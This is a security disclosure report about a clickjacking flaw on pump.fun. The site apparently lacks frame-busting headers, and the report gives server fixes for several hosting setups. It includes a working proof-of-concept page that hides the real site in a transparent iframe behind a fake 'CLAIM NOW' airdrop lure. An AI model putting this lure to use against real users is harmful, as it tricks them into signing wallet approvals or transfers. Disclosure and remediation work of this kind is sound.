# Security Disclosure: Clickjacking Vulnerability on pump.fun

## Executive Summary

**Affected Asset:** `https://pump.fun/`  
**Vulnerability Type:** Clickjacking (UI Redressing)  
**Severity:** Medium (High in the context of Web3 wallet interactions)  
**Status:** Unpatched  

This document serves as a responsible disclosure of a Clickjacking vulnerability on the `pump.fun` web application. The site currently lacks the necessary HTTP security headers to prevent it from being embedded within an iframe on third-party domains. 

Because `pump.fun` is a high-traffic platform where users frequently connect wallets and execute token trades, this vulnerability poses a significant risk. An attacker can overlay the legitimate `pump.fun` interface on a malicious site to trick users into signing unauthorized transactions, such as token approvals or asset transfers.

---

## 1. Vulnerability Details

The `pump.fun` domain does not return the `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` HTTP response headers. 

Without these headers, a web browser will render the site inside an `<iframe>` regardless of the parent domain. Attackers exploit this by loading the target site in a transparent iframe and placing it exactly over a decoy button on their own site (e.g., a "Claim Free SOL" button). When a user clicks what they believe is the decoy button, the click is actually registered by the hidden `pump.fun` interface.

### Proof of Concept (PoC)

**1. Header Verification:**
Running `curl -I https://pump.fun/` returns the following response (note the absence of frame-busting headers):

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: keep-alive
... (other headers) ...
(Missing: X-Frame-Options)
(Missing: Content-Security-Policy: frame-ancestors)

2. Visual Exploit (HTML):
Create a file named poc.html and open it in any web browser:
html

<!DOCTYPE html>
<html>
<head>
    <style>
        body { text-align: center; padding: 50px; background: #1a1a1a; color: #fff; font-family: sans-serif; }
        .decoy { 
            padding: 20px 40px; font-size: 24px; font-weight: bold; 
            background: #00ff88; color: #000; border: none; 
            border-radius: 8px; cursor: pointer; 
        }
        /* The iframe is invisible and covers the entire page */
        iframe { 
            position: absolute; top: 0; left: 0; 
            width: 100vw; height: 100vh; 
            opacity: 0.0001; z-index: 9999; 
            border: none;
        }
    </style>
</head>
<body>
    <h1>🎉 You are eligible for the PUMP Airdrop! 🎉</h1>
    <p>Click below to claim your free tokens.</p>
    <button class="decoy">CLAIM NOW</button>
    
    <!-- The hidden pump.fun interface -->
    <iframe src="https://pump.fun/" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
</body>
</html>

Impact

If a user visits the attacker's page and clicks the decoy button, the click passes through to the invisible pump.fun iframe. Depending on the user's state on pump.fun, an attacker could:

    Trick the user into connecting their wallet to the attacker's profile.

    Trick the user into signing a malicious transaction (e.g., approving an attacker's token to drain their wallet).

    Trick the user into buying a specific token.

2. Remediation & Patch

To mitigate this vulnerability, the pump.fun engineering team must configure the web server or CDN to send specific HTTP response headers.
If hosted on Vercel (Next.js):

Add the following to the next.config.js file:
javascript

module.exports = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'X-Frame-Options',
            value: 'SAMEORIGIN',
          },
          {
            key: 'Content-Security-Policy',
            value: "frame-ancestors 'self';",
          },
        ],
      },
    ]
  },
}

If hosted on Cloudflare:

    Go to the Cloudflare Dashboard for the pump.fun domain.

    Navigate to Rules > Transform Rules > Modify Response Header.

    Create a new rule:

        Header name: X-Frame-Options

        Value: SAMEORIGIN

    Create a second rule:

        Header name: Content-Security-Policy

        Value: frame-ancestors 'self';

If using Nginx:

Add the following inside your server block or location block:
nginx

add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "frame-ancestors 'self';" always;

If using Apache:

Add the following to your .htaccess or virtual host configuration:
apache

Header always set X-Frame-Options "SAMEORIGIN"
Header always set Content-Security-Policy "frame-ancestors 'self';"

3. Disclosure Timeline & Next Steps

I am reporting this vulnerability privately to allow the pump.fun team ample time to remediate the issue before any public disclosure.

Requested Actions:

    Acknowledge receipt of this report.

    Provide an estimated timeline for deploying the header patch.

    Confirm whether pump.fun has an active bug bounty program or a security contact email (e.g., security@pump.fun).

I am happy to coordinate a public disclosure timeline and can provide a screen recording of the exploit if required.

Thank you for your time and for your commitment to securing the Solana ecosystem.

Researcher Contact: Jesus Escobar
Contact Email: infra@jesusescobar.com
Date: 11/09/2026
